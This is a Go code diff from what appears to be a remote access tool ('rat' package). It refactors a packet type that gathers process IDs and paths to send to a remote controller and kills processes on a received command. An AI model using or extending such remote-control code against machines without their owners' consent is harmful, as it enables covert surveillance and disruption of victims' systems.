@@ -6,39 +6,34 @@ import (
 	"rat/common/processes"
 )
 
-type ProcessPacket struct {
+type Process struct {
+	PID  int    `send`
+	Path string `send`
 }
 
-func (packet ProcessPacket) GetHeader() common.PacketHeader {
+type ProcessPacket struct {
+	Action    int       `receive`
+	Processes []Process `send`
+}
+
+func (packet ProcessPacket) Header() common.PacketHeader {
 	return common.ProcessHeader
 }
 
-func (packet ProcessPacket) Write(c *Connection) error {
+func (packet ProcessPacket) Init() {
 	process.QueryProcesses()
 
-	c.WriteInt(len(process.Processes))
-
 	for _, proc := range process.Processes {
-		c.WriteInt(proc.PID)
-		c.WriteString(proc.Path)
+		packet.Processes = append(packet.Processes, Process{proc.PID, proc.Path})
 	}
-
-	return nil
 }
 
-func (packet ProcessPacket) Read(c *Connection) error {
-	t, _ := c.ReadInt()
-	len, _ := c.ReadInt()
+func (packet ProcessPacket) OnReceive() error {
+	t := packet.Action
 
-	for i := 0; i < len; i++ {
-		pid, err := c.ReadInt()
-
-		if err != nil {
-			return err
-		}
-
+	for _, proc := range packet.Processes {
 		if t == processes.Kill {
-			process.Kill(pid)
+			process.Kill(proc.PID)
 		}
 	}
 
